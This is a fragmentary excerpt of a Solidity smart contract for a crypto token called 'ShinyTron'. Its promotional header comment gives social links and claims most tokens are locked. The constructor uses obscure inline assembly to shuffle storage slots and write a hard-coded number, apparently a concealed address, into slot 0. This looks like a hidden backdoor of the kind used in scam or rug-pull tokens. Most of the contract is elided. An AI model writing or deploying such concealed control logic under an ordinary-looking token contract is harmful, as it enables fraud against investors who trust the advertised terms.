...
/*
Welcome to ShinyTron Crypto WORLD!

Telegram: https://t.me/ShinyTron/
Twitter: https://twitter.com/ShinyTron/
Website: https://ShinyTron.crypto
95% of tokens - LOCKED!
...
contract ShinyTron {
    string public constant name = "ShinyTron";
    string public constant symbol = "SHNTR";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(740054106216044141557210971732304755591924544310, 4))}
